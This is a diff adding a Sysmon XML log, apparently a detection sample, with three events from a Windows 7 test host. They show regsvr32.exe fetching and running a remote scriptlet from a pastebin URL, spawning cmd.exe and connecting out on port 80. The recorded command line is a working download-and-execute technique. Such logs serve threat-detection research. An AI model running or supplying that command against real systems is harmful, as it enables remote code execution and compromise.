@@ -1,0 +1,127 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-12T18:35:05.155949300Z" />
+      <EventRecordID>16792</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1880" ThreadID="2020" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-12 18:35:05.140</Data>
+      <Data Name="ProcessGuid">{365abb72-6759-5cd8-0000-0010e2d50f00}</Data>
+      <Data Name="ProcessId">1420</Data>
+      <Data Name="Image">C:\Windows\System32\regsvr32.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Microsoft(C) Register Server</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-63fc-5cd8-0000-0020ee3e0100}</Data>
+      <Data Name="LogonId">0x13eee</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583</Data>
+      <Data Name="ParentProcessGuid">{365abb72-6693-5cd8-0000-0010ae4c0e00}</Data>
+      <Data Name="ParentProcessId">3528</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" </Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-12T18:35:05.780949300Z" />
+      <EventRecordID>16793</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1880" ThreadID="2020" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-12 18:35:05.765</Data>
+      <Data Name="ProcessGuid">{365abb72-6759-5cd8-0000-001085031000}</Data>
+      <Data Name="ProcessId">1912</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+      <Data Name="Description">Windows Command Processor</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\cmd.exe" </Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-63fc-5cd8-0000-0020ee3e0100}</Data>
+      <Data Name="LogonId">0x13eee</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
+      <Data Name="ParentProcessGuid">{365abb72-6759-5cd8-0000-0010e2d50f00}</Data>
+      <Data Name="ParentProcessId">1420</Data>
+      <Data Name="ParentImage">C:\Windows\System32\regsvr32.exe</Data>
+      <Data Name="ParentCommandLine">regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>3</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>3</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-12T18:35:06.562199300Z" />
+      <EventRecordID>16794</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1880" ThreadID="288" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-12 18:35:04.463</Data>
+      <Data Name="ProcessGuid">{365abb72-6759-5cd8-0000-0010e2d50f00}</Data>
+      <Data Name="ProcessId">1420</Data>
+      <Data Name="Image">C:\Windows\System32\regsvr32.exe</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIsIpv6">false</Data>
+      <Data Name="SourceIp">10.0.2.15</Data>
+      <Data Name="SourceHostname">IEWIN7..home</Data>
+      <Data Name="SourcePort">49165</Data>
+      <Data Name="SourcePortName">
+      </Data>
+      <Data Name="DestinationIsIpv6">false</Data>
+      <Data Name="DestinationIp">104.20.208.21</Data>
+      <Data Name="DestinationHostname">
+      </Data>
+      <Data Name="DestinationPort">80</Data>
+      <Data Name="DestinationPortName">http</Data>
+    </EventData>
+  </Event>
+</root>
